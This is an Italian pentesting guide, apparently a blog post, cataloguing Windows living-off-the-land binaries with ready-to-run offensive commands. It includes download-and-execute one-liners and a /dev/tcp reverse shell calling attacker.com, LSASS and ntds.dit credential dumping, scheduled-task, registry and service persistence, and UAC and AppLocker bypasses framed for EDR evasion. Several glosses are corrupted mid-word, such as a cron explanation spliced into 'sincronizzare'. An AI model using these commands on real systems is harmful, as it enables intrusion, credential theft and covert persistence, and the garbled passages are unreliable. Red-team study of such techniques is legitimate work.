---
title: 'LOLBins, GTFOBins e LOOBins: La Guida Completa al Living Off the Land (2026)'
slug: lolbins
description: >-
  Guida completa al Living Off the Land (LotL), LOLBins, GTFOBins e LOOBins per
  Windows Linux e macOS nel 2026. Comandi, tecniche di evasione EDR, privilege
  escalation, lateral movement e post-exploitation con binari nativi e LOLBAS
image: /lolbins-gtfobins-guida-completa-pentesting-2026.webp
draft: false
date: 2026-06-29T00:00:00.000Z
categories:
  - guides-resources
subcategories:
  - tecniche
tags:
  - lolbins
  - ' living off the land'
  - ' red team'
  - evasione antivirus
---

# Manuale Operativo di Living Off the Land: LOLBins, GTFOBins e LOOBins nel Pentesting (2026)

## Cos'è il Living Off the Land?

**Living Off the Land (LotL)** è una tecnica offensiva che sfrutta esclusivamente strumenti già presenti sul sistema bersaglio: binari firmati dal vendor, script shell nativi, interpreti di sistema.

**Definizione:** Un LOLBin (Living Off the Land Binary) è un eseguibile legittimo, firmato digitalmente (cioè Microsoft o il vendor ha messo la sua "firma" sul file, garantendone l'autenticità — gli antivirus tendono a fidarsi dei file firmati) dal produttore del sistema operativo, che può essere abusato per eseguire operazioni offensive al di là del suo scopo originale.

Il termine "Living off the land" fu coniato da Christopher Campbell e Matt Graeber alla conferenza DerbyCon 3. "LOLBins" nacque da una discussione su Twitter, proposto da Philip Goh.

### I quattro progetti di riferimento

| Progetto       | Sistema          | URL                                                          |
| -------------- | ---------------- | ------------------------------------------------------------ |
| **LOLBAS**     | Windows          | [lolbas-project.github.io](https://lolbas-project.github.io) |
| **GTFOBins**   | Linux/Unix       | [gtfobins.github.io](https://gtfobins.github.io)             |
| **LOOBins**    | macOS            | [loobins.io](https://www.loobins.io)                         |
| **LOLDrivers** | Windows (driver) | [loldrivers.io](https://www.loldrivers.io)                   |

***

## Perché usare LOLBins nel pentesting moderno

Gli EDR moderni riconoscono immediatamente tool offensivi classici come Mimikatz o netcat. I LOLBins invece:

* **Firmati digitalmente** dal vendor — l'OS e l'AV si fidano per default
* **Whitelistati** per firma in quasi tutti gli ambienti enterprise
* **Già presenti** — nessun trasferimento di file sospetto
* **Difficili da bloccare** — rimuoverli romperebbe il sistema
* **Rumore minimo** — si confondono con l'attività legittima

> In un red team engagement professionale, usare LOLBins prima di qualsiasi tool esterno non è solo buona prassi — è la prassi corretta.

***

## Windows — LOLBins completi

***

### Esecuzione di codice

#### `cmd.exe` — tricks avanzati

`cmd.exe` è il terminale classico di Windows. Un attaccante che ha già un punto d'accesso può usarlo per lanciare script VBScript o PowerShell senza che sembri sospetto, perché è lo stesso programma usato dagli amministratori ogni giorno.

```cmd
cmd /c "echo CreateObject(""WScript.Shell"").Run ""calc.exe"" > %TEMP%\run.vbs && wscript %TEMP%\run.vbs"
cmd /v:on /c "set x=cmd&& !x!"
cmd /c "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"
```

***

#### `mshta.exe`

Interprete HTA (HTML Application). Supporta VBScript, JScript e ActiveX. Firmato Microsoft.

`mshta.exe` serve normalmente ad aprire file `.hta` (pagine HTML con script). L'abuso consiste nel puntarlo a un file remoto che contiene codice VBScript o JavaScript malevolo. È firmato Microsoft, quindi molti AV non lo bloccano.

```cmd
mshta http://attacker.com/payload.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd.exe"":close")
mshta "javascript:a=new ActiveXObject('Wscript.Shell');a.Run('cmd /c whoami',0,1);close()"
```

***

#### `regsvr32.exe` — Squiblydoo

Con `/i:` esegue script remoti via `scrobj.dll (una DLL (file che contiene codice condiviso — Windows li carica in memoria per far funzionare i programmi) di Windows che sa eseguire script remoti via COM — il motore che rende possibile questo abuso)`. Bypass di molti lista bianca di programmi autorizzati (una policy aziendale che blocca tutto ciò che non è esplicitamente permesso).

`regsvr32.exe` esiste per registrare DLL di sistema. Il trucco — chiamato *Squiblydoo* — usa il flag `/i:` per puntarlo a un file `.sct` remoto che contiene codice arbitrario. È uno dei bypass AppLocker (la funzione Windows che permette agli amministratori di bloccare l'esecuzione di certi programmi) più storici.

```cmd
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
regsvr32 /s /n /u /i:file.sct scrobj.dll
```

***

#### `rundll32.exe`

`rundll32.exe` esegue funzioni esportate da DLL (file che contiene codice condiviso — Windows li carica in memoria per far funzionare i programmi). Windows lo usa continuamente in background. Un attaccante lo usa per eseguire codice passando come argomento una DLL malevola o una funzione COM. È quasi impossibile bloccarlo senza rompere il sistema.

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd.exe")
rundll32.exe pcwutl.dll,LaunchApplication calc.exe
rundll32.exe url.dll,OpenURL http://attacker.com/payload.exe
rundll32.exe zipfldr.dll,RouteTheCall calc.exe
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Temp\dump.dmp full
```

***

#### `wscript.exe` / `cscript.exe`

`wscript.exe` e `cscript.exe` sono gli interpreti ufficiali Windows per script VBScript e JScript. Se un attaccante riesce a far girare un file `.vbs` o `.js`, ha esecuzione di codice praticamente garantita.

```cmd
wscript.exe payload.vbs
wscript.exe //E:jscript payload.js
cscript.exe //nologo payload.vbs
```

***

#### `msiexec.exe`

`msiexec.exe` installa i pacchetti `.msi` (come i normali installer Windows). Il trucco è che supporta URL remoti: si può puntare direttamente a un pacchetto malevolo su internet e verrà installato ed eseguito senza ulteriori richieste.

```cmd
msiexec /i http://attacker.com/payload.msi
msiexec /i payload.msi /quiet /qn
msiexec /z payload.dll
msiexec /y payload.dll
```

***

#### `InstallUtil.exe`

Utility .NET. Esegue assembly con `[System.ComponentModel.RunInstaller(true)]`.

`InstallUtil.exe` fa parte del framework .NET ufficiale Microsoft. Serve per installare componenti .NET. Se si compila un assembly con una classe speciale (`RunInstaller`), `InstallUtil` lo esegue — ottimo per bypassare AppLocker (la funzione Windows che permette agli amministratori di bloccare l'esecuzione di certi programmi) perché il binario vive in un path fidato.

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

***

#### `MSBuild.exe`

Compila ed esegue codice C# inline da file XML — nessun .exe necessario.

`MSBuild.exe` compila progetti .NET. Il punto interessante è che il file di progetto `.csproj` può contenere codice C# *inline* — nessun file `.exe` separato. Si scrive codice dentro un XML e MSBuild lo compila e lo esegue in memoria.

```xml
<!-- payload.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <ClassTask />
  </Target>
  <UsingTask TaskName="ClassTask" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System.Diagnostics;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          public class ClassTask : Task, ITask {
            public override bool Execute() {
              Process.Start("cmd.exe", "/c whoami > C:\\Temp\\out.txt");
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
msbuild.exe payload.csproj
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj
```

***

#### `cmstp.exe`

Connection Manager Setup. Esegue codice arbitrario tramite file INF.

`cmstp.exe` configura profili VPN per Connection Manager. Accetta file `.inf` di configurazione, ma quei file possono includere istruzioni per eseguire DLL (file che contiene codice condiviso — Windows li carica in memoria per far funzionare i programmi) o programmi. Utile anche per il bypass UAC (User Account Control — il popup di Windows che chiede conferma prima di eseguire azioni da amministratore).

```cmd
cmstp.exe /s /ns payload.inf
```

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
[RegisterOCXSection]
C:\Windows\System32\calc.exe
```

***

#### `odbcconf.exe`

`odbcconf.exe` gestisce i driver ODBC (connessioni database). Con il flag `/A {REGSVR}` può registrare — e quindi eseguire — una DLL (file che contiene codice condiviso — Windows li carica in memoria per far funzionare i programmi) arbitraria. Spesso ignorato dai sistemi di monitoring.

```cmd
odbcconf.exe /S /A {REGSVR C:\path\payload.dll}
```

***

#### `xwizard.exe`

`xwizard.exe` è l'Extensible Wizard Host di Windows. Può essere invocato con GUID specifici per caricare componenti COM. In ambienti non aggiornati è utile per DLL (file che contiene codice condiviso — Windows li carica in memoria per far funzionare i programmi) hijacking — Windows cerca le DLL prima nella cartella del programma, poi in System32. Mettendo una DLL malevola con il nome giusto nella cartella sbagliata, il programma carica quella nostra invece dell'originale.

```cmd
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d}
```

***

#### `pcalua.exe`

`pcalua.exe` è il Program Compatibility Assistant. Serve a far girare vecchi programmi in modalità compatibilità. Il flag `-a` esegue qualsiasi file — locale o da rete — bypassando alcune restrizioni.

```cmd
pcalua.exe -a calc.exe
pcalua.exe -a \\attacker.com\share\payload.exe
pcalua.exe -a C:\Temp\payload.dll -c "arg1 arg2"
```

***

#### `SyncAppvPublishingServer.exe`

Bypassa le policy di esecuzione PowerShell.

`SyncAppvPublishingServer.exe` è usato da App-V per sincron (lo scheduler di Linux — esegue automaticamente comandi a orari prestabiliti, anche dopo un riavvio)izzare app virtualizzate. Il trucco: accetta comandi PowerShell come argomento, eseguendoli senza rispettare le policy di esecuzione (`ExecutionPolicy`).

```cmd
SyncAppvPublishingServer.exe "n; Start-Process calc.exe"
SyncAppvPublishingServer.exe "n; IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"
```

***

#### `hh.exe`

HTML Help. Esegue file CHM con codice JavaScript/VBScript embedded.

`hh.exe` apre i file di aiuto `.chm` di Windows. Un file `.chm` è essenzialmente HTML con JavaScript o VBScript embedded. Se costruito ad hoc, può eseguire codice sulla macchina di chi lo apre.

```cmd
hh.exe http://attacker.com/payload.chm
hh.exe C:\Temp\payload.chm
```

***

#### `forfiles.exe`

Itera su file di sistema, esegue comandi per ogni match.

`forfiles.exe` itera su file di sistema ed esegue un comando per ciascuno. Di per sé non fa nulla di malevolo, ma il parametro `/c` accetta qualsiasi comando — incluso un comando PowerShell. Utile per proxy execution — usare un programma legittimo come trampolino per eseguire codice, così nei log risulta che ha agito il programma legittimo e non il nostro.

```cmd
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c calc.exe"
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c \"powershell -nop -w hidden -enc <base64>\""
```

***

#### `appvlp.exe`

`appvlp.exe` è il launcher dell'Application Virtualization di Microsoft. Può essere usato per eseguire un binario esterno in un contesto fidato, bypassando alcuni controlli.

```cmd
appvlp.exe C:\Temp\payload.exe
appvlp.exe "C:\Windows\System32\cmd.exe /c whoami"
```

***

#### `bash.exe` (WSL)

Se Windows Subsystem for Linux (WSL) è installato, `bash.exe` dà accesso diretto a un ambiente Linux dentro Windows. Per un attaccante è l'equivalente di avere già una shell Linux — con tutti i GTFOBins disponibili.

```cmd
bash.exe -c "id"
bash.exe -c "curl http://attacker.com/payload.sh | bash"
C:\Windows\System32\bash.exe -c "/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1"
```

***

#### `wsl.exe`

`wsl.exe` è il launcher ufficiale di WSL. Permette di eseguire comandi Linux direttamente dal terminale Windows. Se WSL è presente, si possono usare tool Linux su una macchina Windows senza installare nulla.

```cmd
wsl whoami
wsl -e /bin/bash
wsl -e curl http://attacker.com/payload.sh -o /tmp/payload.sh
```

***

#### `gpscript.exe`

Group Policy (le regole di configurazione che un amministratore imposta centralmente per tutti i computer dell'azienda) Script Processor.

`gpscript.exe` esegue gli script di Group Policy (logon/startup). In un ambiente aziendale, lanciarlo con i flag giusti può forzare l'esecuzione di script configurati nelle policy — utile per persistenza.

```cmd
gpscript /logon
gpscript /startup
```

***

#### `ie4uinit.exe`

`ie4uinit.exe` inizializza alcune impostazioni per utente di Internet Explorer. Legge un file di configurazione dal profilo utente che può essere modificato per eseguire comandi arbitrari.

```cmd
ie4uinit.exe -BaseSettings
```

***

#### `infdefaultinstall.exe`

`infdefaultinstall.exe` installa file `.inf` eseguendo la sezione `[DefaultInstall]`. I file `.inf` sono script di configurazione Windows — possono registrare DLL (file che contiene codice condiviso — Windows li carica in memoria per far funzionare i programmi), copiare file, ed eseguire comandi.

```cmd
infdefaultinstall.exe payload.inf
```

***

#### `rasautou.exe`

Carica DLL (file che contiene codice condiviso — Windows li carica in memoria per far funzionare i programmi) arbitrarie tramite parametri.

`rasautou.exe` è il dialer automatico di connessioni remote. Accetta come parametro una DLL da caricare — permette di eseguire codice da una DLL arbitraria senza usare `rundll32.exe`.

```cmd
rasautou.exe -o C:\Temp\payload.dll -p parameter
```

***

#### `rpcping.exe`

Può forzare autenticazione NTLM (un protocollo di autenticazione Windows — manda la password in forma cifrata, che può essere catturata e riutilizzata) verso host esterno.

`rpcping.exe` testa la connettività RPC (Remote Procedure Call — un protocollo Windows per eseguire funzioni su macchine remote). Può essere usato per forzare l'autenticazione NTLM verso un host controllato dall'attaccante — utile per catturare hash NTLM (la password cifrata dell'utente, recuperabile dalla memoria) e craccarli offline.

```cmd
rpcping -s attacker.com -e 1234 -a privacy -u NTLM
```

***

#### `vsjitdebugger.exe`

È il debugger JIT di Visual Studio. Se presente nel sistema (molto comune in ambienti dev), può essere puntato a un processo per iniettare un debugger — utile per analisi o code injection — inserire codice malevolo dentro un programma già avviato.

```cmd
vsjitdebugger.exe -p <PID>
```

***

#### `wab.exe`

Windows Address Book. Vulnerabile a DLL (file che contiene codice condiviso — Windows li carica in memoria per far funzionare i programmi) hijacking — Windows cerca le DLL prima nella cartella del programma, poi in System32. Mettendo una DLL malevola con il nome giusto nella cartella sbagliata, il programma carica quella nostra invece dell'originale (`wab32.dll`).

`wab.exe` è la rubrica di Windows. È vulnerabile a DLL hijacking: cerca `wab32.dll` nella directory corrente prima di cercarla in System32. Basta mettere una DLL malevola con quel nome nella stessa cartella.

```cmd
copy C:\Temp\malicious.dll C:\Temp\wab32.dll && wab.exe
```

***

#### `wsreset.exe`

Windows Store reset — UAC (User Account Control — il popup di Windows che chiede conferma prima di eseguire azioni da amministratore) bypass consolidato.

`wsreset.exe` resetta la cache di Windows Store. Il fatto interessante: si esegue come amministratore senza mostrare il prompt UAC. Quindi lanciandolo dopo aver modificato certe chiavi di registro, si ottiene una shell elevata.

```cmd
wsreset.exe
```

***

#### `pktmon.exe`

Packet Monitor nativo (Windows 10 1809+). Surrogato stealth di Wireshark.

`pktmon.exe` è il packet monitor integrato in Windows 10 (build 1809+). Cattura traffico di rete senza installare Wireshark — invisibile agli scanner che cercano tool di sniffing di terze parti.

```cmd
pktmon start --capture --file C:\Temp\capture.etl
pktmon stop
pktmon etl2txt C:\Temp\capture.etl
```

***

#### `ttdinject.exe` / `tttracer.exe`

Time Travel Debugging — può iniettare in processi.

Fanno parte del Time Travel Debugging di Windows. Permettono di iniettare componenti di debug nei processi in esecuzione. In mani offensive, questa capacità di injection può essere abusata.

```cmd
ttdinject.exe -ClientParams "7 tmp.txt 0 0 0 0" -Show
tttracer.exe -dumpFull -attach <PID>
```

***

#### `stordiag.exe`

Tool diagnostico per lo storage Windows. In alcune versioni può essere utilizzato per eseguire comandi sotto certe condizioni — principalmente per proxy execution — usare un programma legittimo come trampolino per eseguire codice, così nei log risulta che ha agito il programma legittimo e non il nostro.

```cmd
stordiag.exe -collectEtw 1 -t 1
```

***

### Compilatori .NET nativi

#### `csc.exe` — C# compiler

`csc.exe` è il compilatore C# ufficiale di Microsoft, incluso nel .NET Framework. Con esso si può compilare codice C# al volo su qualsiasi macchina Windows — senza Visual Studio, senza installare nulla. Si scrive il codice sorgente in un `.cs`, si compila, si esegue.

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Temp\payload.exe payload.cs
```

```csharp
// payload.cs
using System;
using System.Diagnostics;
class Payload {
    static void Main() {
        Process.Start("cmd.exe", "/c whoami > C:\\Temp\\out.txt");
    }
}
```

***

#### `vbc.exe` — VB.NET compiler

Come `csc.exe` ma per Visual Basic .NET. Presente su qualsiasi macchina con .NET Framework installato (praticamente tutti i Windows moderni).

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe /out:C:\Temp\payload.exe payload.vb
```

***

#### `jsc.exe` — JScript compiler

Compila script JScript in eseguibili .NET. Meno conosciuto degli altri, spesso dimenticato dai difensori.

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe payload.js
```

***

#### `dotnet.exe`

La CLI ufficiale di .NET Core/.NET 5+. Se presente, permette di compilare ed eseguire progetti .NET direttamente da riga di comando.

```cmd
dotnet run --project C:\Temp\payload\
dotnet payload.dll
```

***

#### `Microsoft.Workflow.Compiler.exe`

Compila workflow XAML con codice C# inline.

Compila workflow XAML (usati da SharePoint e altri prodotti Microsoft). La particolarità è che il file XAML può contenere codice C# inline — quindi è un altro modo per eseguire C# arbitrario usando un binario firmato Microsoft.

```cmd
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe" args.xml results.xml
```

***

#### `regasm.exe` / `regsvcs.exe`

Path trusted da AppLocker (la funzione Windows che permette agli amministratori di bloccare l'esecuzione di certi programmi). Eseguono assembly .NET.

Registrano assembly .NET come componenti COM. Vivono in un path (`C:\Windows\Microsoft.NET`) che AppLocker spesso considera trusted. Caricano ed eseguono l'assembly — se quell'assembly fa cose malevole, vengono eseguite.

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U C:\Temp\payload.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe C:\Temp\payload.dll
```

***

### Download e trasferimento file

#### `certutil.exe`

`certutil.exe` è uno strumento per gestire certificati digitali. Può fare molto altro: scaricare file da internet, codificare/decodificare file in Base64. È uno dei LOLBins più abusati di sempre — ed è anche uno dei più monitorati, quindi in ambienti con EDR (Endpoint Detection & Response — software di sicurezza avanzato usato dalle aziende, più sofisticato di un normale antivirus: analizza il comportamento dei programmi, non solo i file) robusti conviene evitarlo.

```cmd
certutil -urlcache -split -f http://attacker.com/payload.exe C:\Temp\payload.exe
certutil -decode encoded.b64 decoded.exe
certutil -encode file.exe file.b64
certutil -urlcache -split -f http://attacker.com/payload.ps1 C:\Temp\payload.ps1
```

***

#### `bitsadmin.exe`

`bitsadmin.exe` gestisce i trasferimenti BITS (Background Intelligent Transfer Service — il servizio Windows che scarica aggiornamenti in background, usato da Windows Update) (Background Intelligent Transfer Service) — lo stesso meccanismo usato da Windows Update per scaricare aggiornamenti in background. Può scaricare file e creare "job" che sopravvivono ai riavvii.

```cmd
bitsadmin /transfer job /download /priority high http://attacker.com/p.exe C:\Temp\p.exe
bitsadmin /create backdoor
bitsadmin /addfile backdoor http://attacker.com/p.exe C:\Temp\p.exe
bitsadmin /SetNotifyCmdLine backdoor C:\Temp\p.exe NULL
bitsadmin /SetMinRetryDelay backdoor 60
bitsadmin /resume backdoor
```

***

#### `PowerShell` — download

PowerShell ha funzionalità di rete native. `Net.WebClient` e `Invoke-WebRequest` scaricano file o eseguono script direttamente dalla memoria — senza mai toccare il disco. Eseguire uno script in memoria (`IEX`) è molto più difficile da rilevare che scrivere un file.

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
Invoke-WebRequest -Uri 'http://attacker.com/p.exe' -OutFile 'C:\Temp\p.exe'
(New-Object Net.WebClient).DownloadFile('http://attacker.com/p.exe','C:\Temp\p.exe')
Start-BitsTransfer -Source http://attacker.com/p.exe -Destination C:\Temp\p.exe
```

***

#### `expand.exe`

`expand.exe` estrae file compressi in formato `.cab`. Può copiare file anche da percorsi di rete UNC (`\\server\share`), rendendolo utile per trasferire file tra macchine senza usare strumenti di rete ovvi.

```cmd
expand \\attacker.com\share\payload.exe C:\Temp\payload.exe
expand -r C:\Temp\payload.cab C:\Temp\
```

***

#### `extrac32.exe`

Alternativa a `expand.exe` per file `.cab`. Meno conosciuto dai difensori, quindi genera meno alert.

```cmd
extrac32 /y /C http://attacker.com/payload.cab C:\Temp\payload.exe
extrac32 payload.cab
```

***

#### `desktopimgdownldr.exe`

Scarica immagini per lo sfondo della lock screen. Può essere ingannato per scaricare file arbitrari modificando la variabile d'ambiente `SYSTEM (il livello di privilegio più alto su Windows — superiore anche all'amministratore, è l'account del sistema operativo stesso)ROOT`. Non è quasi mai monitorato.

```cmd
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://attacker.com/p.exe /eventName:desktopimgdownldr
```

***

#### `esentutl.exe`

Copia file locked (es. NTDS.dit (il file database di Active Directory — contiene le password cifrate di tutti gli utenti dell'intera rete aziendale)).

Gestisce database ESE (usati da Active Directory (il sistema Microsoft per gestire centralmente tutti gli utenti, computer e permessi di una rete aziendale), Windows Update, ecc.). Può copiare file che normalmente sono bloccati perché in uso — come `ntds.dit`, il database di Active Directory che contiene tutti gli hash delle password del dominio.

```cmd
esentutl.exe /y \\attacker.com\share\payload.exe /d C:\Temp\payload.exe /o
esentutl.exe /cp C:\Windows\System32\ntds.dit C:\Temp\ntds.dit
```

***

#### `mavinject.exe`

Tool Microsoft per iniettare DLL (file che contiene codice condiviso — Windows li carica in memoria per far funzionare i programmi) in processi già in esecuzione — usato nell'App-V virtualization. In mani offensive, permette di fare process injection — inserire codice malevolo dentro un altro processo già in esecuzione, così il codice gira sotto l'identità di quel processo (inserire codice in un altro processo) senza usare tool di terze parti.

```cmd
mavinject.exe <PID> /INJECTRUNNING C:\path\payload.dll
```

***

#### `replace.exe`

Sostituisce file di sistema. Può anche copiare file da percorsi UNC remoti verso la macchina locale — un modo alternativo per trasferire file.

```cmd
replace.exe \\attacker.com\share\payload.exe C:\Temp\ /a
```

***

#### `makecab.exe`

Compressione CAB (Cabinet — un formato di archivio compresso proprietario di Microsoft) — utile per esfiltrazione (copia di dati sensibili verso l'esterno, verso un server controllato dall'attaccante) compressa.

Crea archivi compressi `.cab`. Utile per comprimere dati da esfiltrare (copiare dati fuori dalla rete della vittima verso un server controllato dall'attaccante) prima di trasferirli — meno dimensioni, meno traffico anomalo.

```cmd
makecab C:\Temp\loot.txt C:\Temp\loot.cab
makecab /f filelist.ddf
```

***

#### `finger.exe`

Client del protocollo Finger (anni '80). Ancora presente in Windows. Può essere abusato per inviare/ricevere piccole quantità di dati usando un protocollo così vecchio che quasi nessuno lo monitora.

```cmd
finger user@attacker.com
```

***

#### `ftp.exe`

Client FTP nativo di Windows. Supporta la lettura di comandi da un file di testo — perfetto per automatizzare il download di payload senza tool esterni.

```cmd
ftp -s:C:\Temp\ftp_commands.txt attacker.com
```

```
open attacker.com
anonymous
anonymous
binary
get payload.exe C:\Temp\payload.exe
quit
```

***

#### `sftp.exe` / `ssh.exe` (Windows 10+)

Da Windows 10 (build 1803), Microsoft ha incluso client SSH e SFTP nativi. Permettono connessioni SSH, trasferimento file e tunnel — tutto con binari firmati Microsoft, spesso non monitorati come tool SSH di terze parti.

```cmd
sftp user@attacker.com:/payload.exe C:\Temp\payload.exe
ssh user@attacker.com "cat /etc/passwd"
ssh -R 4444:localhost:4444 user@attacker.com
```

***

#### `winrm.cmd` / `winrs.exe`

WinRM (Windows Remote Management — il protocollo Microsoft per gestire macchine Windows da remoto, simile a SSH) (Windows Remote Management) è il protocollo di gestione remota di Windows, basato su HTTP/HTTPS. `winrs.exe` è essenzialmente una shell remota — come SSH ma per Windows. Se abilitato, permette l'esecuzione di comandi su host remoti con credenziali valide.

```cmd
winrs -r:http://192.168.1.10:5985 -u:DOMAIN\Admin -p:Password1 "cmd /c whoami"
```

***

#### `msdeploy.exe`

Microsoft Web Deploy — usato per sincron (lo scheduler di Linux — esegue automaticamente comandi a orari prestabiliti, anche dopo un riavvio)izzare siti web e applicazioni IIS. Può trasferire file tra sistemi come side effect della sua funzione principale.

```cmd
msdeploy -verb:sync -source:contentPath=C:\Temp\payload.exe -dest:contentPath=C:\Windows\Temp\payload.exe
```

***

#### `msdt.exe`

Noto per Follina (CVE-2022-30190).

Microsoft Support Diagnostic Tool. Famoso per la vulnerabilità **Follina** (CVE-2022-30190, maggio 2022): un file Word poteva eseguire codice PowerShell arbitrario tramite `msdt.exe` senza alcuna interazione utente oltre all'apertura del documento.

```cmd
msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_BrowseForFile=C:\Temp\payload.exe"
```

***

### Persistenza

#### `schtasks.exe`

`schtasks.exe` crea operazioni pianificate — come il "Task Scheduler" che vedi nel Pannello di controllo. Un attaccante lo usa per far rieseguire un payload automaticamente: al login, ogni minuto, all'avvio. È persistenza senza toccare il registro.

```cmd
schtasks /create /sc ONLOGON /tn "WindowsUpdate" /tr "C:\Temp\payload.exe" /ru SYSTEM
schtasks /create /sc minute /mo 1 /tn "Updater" /tr "cmd.exe /c C:\Temp\payload.exe"
schtasks /create /sc ONSTARTUP /tn "Persistence" /tr "C:\Temp\payload.exe" /f
schtasks /run /tn "WindowsUpdate"
schtasks /query /tn "WindowsUpdate" /fo LIST
```

***

#### `reg.exe`

`reg.exe` modifica il Registro di Windows da riga di comando. Le chiavi `Run` e `RunOnce` sono le più usate per la persistenza: qualsiasi valore lì dentro viene eseguito ad ogni login utente. L'IFEO (Image File Execution Options) permette di intercettare l'apertura di un programma specifico.

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Temp\payload.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Temp\payload.exe"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "userinit.exe,C:\Temp\payload.exe" /f
```

***

#### `sc.exe`

`sc.exe` gestisce i servizi Windows. Creare un servizio con `start= auto` significa che il payload viene eseguito ad ogni avvio del sistema, con privilegi di SYSTEM (il livello di privilegio più alto su Windows — superiore anche all'amministratore, è l'account del sistema operativo stesso) — il massimo livello di privilegio su Windows.

```cmd
sc create EvilSvc binpath= "cmd.exe /c C:\Temp\payload.exe" start= auto
sc start EvilSvc
sc description EvilSvc "Windows Defender Update Service"
```

***

#### `secedit.exe`

Configura le policy di sicurezza locali importando file `.inf`. Un file `.inf` malevolo può aggiungere script di startup o modificare diritti utente.

```cmd
secedit /configure /db C:\Windows\security\local.sdb /cfg malicious.inf /overwrite
```

***

#### `dnscmd.exe`

In ambienti AD, aggiunge record DNS malevoli.

Gestisce server DNS Windows. In ambienti Active Directory (il sistema Microsoft per gestire centralmente tutti gli utenti, computer e permessi di una rete aziendale), aggiungere record DNS malevoli può redirigere traffico di rete verso host controllati dall'attaccante — tecnica chiamata *DNS poisoning* interno.

```cmd
dnscmd /enumrecords DOMAIN.LOCAL . /type A
dnscmd /recordadd DOMAIN.LOCAL evil A 192.168.1.100
```

***

### Bypass UAC (User Account Control — il popup di Windows che chiede conferma prima di eseguire azioni da amministratore) & AppLocker (la funzione Windows che permette agli amministratori di bloccare l'esecuzione di certi programmi)

#### `fodhelper.exe`

`fodhelper.exe` gestisce le features opzionali di Windows. Per farlo si autoeleva (bypass UAC). Modificando una chiave di registro nel profilo utente corrente *prima* di lanciarlo, si può far eseguire codice arbitrario con privilegi elevati — senza il popup UAC.

```cmd
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
```

***

#### `eventvwr.exe`

Il Visualizzatore eventi si autoeleva senza prompt UAC (User Account Control — il popup di Windows che chiede conferma prima di eseguire azioni da amministratore). Con la stessa tecnica di `fodhelper.exe` — modificare una chiave registro nel hive utente — lo si usa come trampolino per ottenere un processo elevato.

```cmd
REG ADD "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe
```

***

#### `sdclt.exe`

Il backup di Windows. Si autoeleva silenziosamente. Modificando `HKCU\Software\Classes\exefile\shell\runas\command`, quando `sdclt.exe` cerca di elevare richiama il comando che abbiamo impostato noi — con privilegi da amministratore.

```cmd
REG ADD "HKCU\Software\Classes\exefile\shell\runas\command" /ve /d "cmd.exe" /f
REG ADD "HKCU\Software\Classes\exefile\shell\runas\command" /v IsolatedCommand /t REG_SZ /d "cmd.exe" /f
sdclt.exe /KICKOFFELEV
```

***

#### `cmstp.exe` (UAC (User Account Control — il popup di Windows che chiede conferma prima di eseguire azioni da amministratore) bypass)

```cmd
cmstp.exe /s /ns C:\Temp\bypass.inf
Stessa categoria — file INF + cmstp.exe = esecuzione elevata. Utile perché funzionava su versioni di Windows dove `fodhelper` era già patchato.

```

***

### Ricognizione e Discovery

#### `net.exe` / `net1.exe`

`net.exe` è il coltellino svizzero dell'amministrazione Windows. Con esso si vede tutto: utenti, gruppi, condivisioni, orario. In fase di ricognizione post-accesso è il primo strumento da usare per capire in che dominio si è e chi sono gli amministratori.

```cmd
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net localgroup administrators
net share
net view /all
net accounts /domain
net time \\dc01
```

***

#### `nltest.exe`

